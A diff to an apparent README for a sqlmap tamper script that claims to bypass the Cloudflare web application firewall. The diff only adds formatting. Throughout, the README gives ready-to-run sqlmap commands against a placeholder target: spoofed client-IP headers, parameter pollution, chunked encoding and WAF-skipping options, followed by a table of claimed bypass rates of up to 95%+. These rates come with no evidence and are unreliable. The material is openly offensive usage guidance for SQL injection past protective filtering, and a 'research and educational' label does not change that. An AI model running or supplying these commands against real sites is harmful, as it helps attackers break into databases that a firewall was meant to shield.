@@ -2,6 +2,7 @@
 CloudFlare Ultimate WAF Bypass Tamper Script Comprehensive evasion techniques collection Research and educational purposes only by KL3FT3Z.
 
 # Basic usage
+```bash
 sqlmap -u "http://target/page.php?id=1" \
     --tamper=Knockin' on Heaven's Door.py \
     --level=5 \
@@ -9,8 +10,10 @@ sqlmap -u "http://target/page.php?id=1" \
     --delay=1-3 \
     --timeout=30 \
     --batch
+```
 
 # Advanced usage with additional headers
+```bash
 sqlmap -u "http://target/page.php?id=1" \
     --tamper=Knockin' on Heaven's Door.py \
     --headers="X-Forwarded-For: 127.0.0.1\nX-Real-IP: 127.0.0.1\nX-Originating-IP: 127.0.0.1\nCF-Connecting-IP: 127.0.0.1" \
@@ -24,13 +27,17 @@ sqlmap -u "http://target/page.php?id=1" \
     --threads=1 \
     --technique=BEUST \
     --batch
+```
 
 # HTTP Parameter Pollution (HPP)
+```bash
 sqlmap -u "http://target/page.php?id=1&id=2" \
     --tamper=Knockin' on Heaven's Door.py \
     --hpp
+```
 
 # Chunked Transfer Encoding
+```bash
 sqlmap -u "http://target/page.php" \
     --data="id=1" \
     --tamper=Knockin' on Heaven's Door.py \
@@ -41,13 +48,15 @@ sqlmap -u "http://target/page.php?id=1" \
     --tamper=Knockin' on Heaven's Door.py \
     --identify-waf \
     --skip-waf
+```
 
-Technique Bypass Rate Stealth Level
-Unicode Normalize	85%	  High
-Multi-layer Encoding 90%  Very High
-Comment Fragmentation 88% High
-Invisible Characters 92%  Very High
-Scientific Notation	75%	  Medium
-JSON/XML Wrapping	80%	  High
-Character Confusion	85%	 High
-Combined Ultimate	95%+  Maximum
+## Technique Bypass Rate Stealth Level
+
+* Unicode Normalize	85%	  High
+* Multi-layer Encoding 90%  Very High
+* Comment Fragmentation 88% High
+* Invisible Characters 92%  Very High
+* Scientific Notation	75%	  Medium
+* JSON/XML Wrapping	80%	  High
+* Character Confusion	85%	 High
+* Combined Ultimate	95%+  Maximum
